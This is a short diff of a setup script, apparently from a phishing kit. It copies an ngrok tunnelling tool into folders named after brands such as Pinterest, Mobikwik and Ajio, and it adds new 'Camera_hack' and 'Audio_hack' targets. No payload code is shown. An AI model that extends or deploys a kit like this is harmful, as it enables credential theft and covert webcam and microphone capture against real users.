@@ -60,6 +60,8 @@ cp -R ngrok phs/ajio/
 cp -R ngrok phs/cryptocurrency/
 cp -R ngrok phs/mobikwik/
 cp -R ngrok phs/pinterest/
+cp -R ngrok phs/Camera_hack 
+cp -R ngrok phs/Audio_hack
 clear
 echo ""
 echo ""
